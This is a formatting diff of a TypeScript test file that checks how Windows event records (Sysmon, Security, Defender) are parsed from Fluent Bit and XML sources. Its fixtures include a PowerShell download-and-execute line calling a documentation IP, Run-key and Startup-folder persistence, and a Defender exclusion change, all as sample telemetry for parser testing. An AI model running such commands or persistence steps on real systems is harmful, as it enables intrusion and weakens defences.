@@ -133,7 +133,10 @@ const SYSMON_PROCESS: Array<[string, string]> = [
   ["LogonId", "0x3C3E6"],
   ["TerminalSessionId", "1"],
   ["IntegrityLevel", "High"],
-  ["Hashes", "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C"],
+  [
+    "Hashes",
+    "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+  ],
   ["ParentProcessGuid", "{5B0B8C3E-1A2A-6720-0000-0010E1B2C300}"],
   ["ParentProcessId", "4100"],
   ["ParentImage", "C:\\Windows\\System32\\cmd.exe"],
@@ -179,7 +182,10 @@ const EVENTS: Array<[string, WindowsEventSpec]> = [
     spec(4698, SECURITY, "Security", [
       ...SUBJECT,
       ["TaskName", "\\Updater"],
-      ["TaskContent", "<Task><Actions><Exec><Command>powershell.exe</Command></Exec></Actions></Task>"],
+      [
+        "TaskContent",
+        "<Task><Actions><Exec><Command>powershell.exe</Command></Exec></Actions></Task>",
+      ],
     ]),
   ],
   [
@@ -331,7 +337,10 @@ const EVENTS: Array<[string, WindowsEventSpec]> = [
       [
         ["MessageNumber", "1"],
         ["MessageTotal", "1"],
-        ["ScriptBlockText", "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a')"],
+        [
+          "ScriptBlockText",
+          "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a')",
+        ],
         ["ScriptBlockId", "7c0b6a54-3c8b-4c58-9a9f-5d7f0a2b1c3d"],
         ["Path", "C:\\Users\\alice\\run.ps1"],
       ],
@@ -353,9 +362,11 @@ const EVENTS: Array<[string, WindowsEventSpec]> = [
       1117,
       WINDOWS_PROVIDERS.defender,
       "Microsoft-Windows-Windows Defender/Operational",
-      DEFENDER_FOUND.map(([name, value]: [string, string]): [string, string] => {
-        return [name, name === "Action Name" ? "Quarantine" : value];
-      }),
+      DEFENDER_FOUND.map(
+        ([name, value]: [string, string]): [string, string] => {
+          return [name, name === "Action Name" ? "Quarantine" : value];
+        },
+      ),
     ),
   ],
   [
@@ -367,8 +378,14 @@ const EVENTS: Array<[string, WindowsEventSpec]> = [
       [
         ["Product Name", "Microsoft Defender Antivirus"],
         ["Product Version", "4.18.25090.3"],
-        ["Old Value", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0"],
-        ["New Value", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x1"],
+        [
+          "Old Value",
+          "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0",
+        ],
+        [
+          "New Value",
+          "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x1",
+        ],
       ],
     ),
   ],
@@ -448,8 +465,14 @@ const EVENTS: Array<[string, WindowsEventSpec]> = [
       ["UtcTime", "2026-10-30 10:00:00.123"],
       ["ProcessGuid", "{5B0B8C3E-1A2B-6720-0000-0010F1C2D300}"],
       ["ProcessId", "4242"],
-      ["Image", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"],
-      ["TargetFilename", "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.lnk"],
+      [
+        "Image",
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      ],
+      [
+        "TargetFilename",
+        "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.lnk",
+      ],
       ["CreationUtcTime", "2026-10-30 10:00:00.120"],
       ["User", "CORP\\alice"],
     ]),
@@ -463,7 +486,10 @@ const EVENTS: Array<[string, WindowsEventSpec]> = [
       ["ProcessGuid", "{5B0B8C3E-1A2B-6720-0000-0010F1C2D300}"],
       ["ProcessId", "4242"],
       ["Image", "C:\\Windows\\regedit.exe"],
-      ["TargetObject", "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"],
+      [
+        "TargetObject",
+        "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+      ],
       ["Details", "C:\\Users\\alice\\updater.exe"],
       ["User", "CORP\\alice"],
     ]),
@@ -527,9 +553,7 @@ describe("Fluent Bit's winevtlog reads as the sources that name their fields", (
       const shipped: WindowsEventRecord = readWindowsEventRecord(
         fluentBitBody(event),
       )!;
-      const named: WindowsEventRecord = readWindowsEventRecord(
-        xmlBody(event),
-      )!;
+      const named: WindowsEventRecord = readWindowsEventRecord(xmlBody(event))!;
 
       for (const [name, value] of [
         ...(event.data || []),
@@ -629,12 +653,12 @@ describe("Fluent Bit's winevtlog reads as the sources that name their fields", (
     expect(
       byTitle.get("Sysmon: a process created (1)")!.parentProcessName,
     ).toBe("cmd.exe");
-    expect(
-      byTitle.get("Sysmon: a network connection (3)")!.targetIp,
-    ).toBe("203.0.113.50");
-    expect(
-      byTitle.get("Sysmon: a network connection (3)")!.targetPort,
-    ).toBe(443);
+    expect(byTitle.get("Sysmon: a network connection (3)")!.targetIp).toBe(
+      "203.0.113.50",
+    );
+    expect(byTitle.get("Sysmon: a network connection (3)")!.targetPort).toBe(
+      443,
+    );
     expect(byTitle.get("Sysmon: lsass opened (10)")!.severityName).toBe(
       "Medium",
     );
@@ -664,9 +688,7 @@ describe("a layout is used only where it fits", () => {
     expect(withoutOriginalFileName).toHaveLength(21);
     // Not CommandLine read as OriginalFileName, one place off.
     expect(old.data["OriginalFileName"]).toBeUndefined();
-    expect(old.data["param11"]).toBe(
-      "C:\\Users\\alice\\",
-    );
+    expect(old.data["param11"]).toBe("C:\\Users\\alice\\");
     expect(STRING_INSERT_MINIMUM_COUNTS.get("microsoft-windows-sysmon:1")).toBe(
       22,
     );
